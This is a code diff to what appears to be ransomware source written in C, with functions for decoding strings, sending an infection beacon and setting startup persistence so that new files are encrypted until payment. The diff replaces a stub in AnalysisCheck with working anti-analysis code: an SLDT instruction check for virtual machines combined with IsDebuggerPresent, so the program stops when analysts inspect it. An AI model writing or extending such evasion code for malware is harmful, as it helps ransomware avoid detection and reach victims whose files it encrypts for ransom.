@@ -285,14 +285,16 @@ void DecodeStrings()
 	HexToString(strNotAllYourFilesAreBelongToYou, strNotAllYourFilesAreBelongToYou);
 }
 
+//POST: True if VM or debugger found, false otherwise.
 bool AnalysisCheck()
 {
-	// TODO: Add code to check for a debugger, execution in a VM, or other dynamic analysis indicators
+	unsigned char ldtr[5] = "\xef\xbe\xad\xde";
+	unsigned long ldt = 0;
 
-	// Returning TRUE will halt program execution
-	// Returning FALSE will allow program execution to proceed
+	_asm sldt ldtr
+	ldt = *((unsigned long *)&ldtr[0]);
 
-	return false; // stubbed for now allow execution
+	return (ldt != 0xdead0000 || IsDebuggerPresent());
 }
 
 void SendInfectionBeacon(DWORD dwEncryptedFileCount)
@@ -321,6 +323,7 @@ void SaveStartupPersistence()
 	// By continuing to run program at startup, any new files will be 
 	// encrypted until payment is received
 	//
+
 }
 
 void DeleteStartupPersistence()
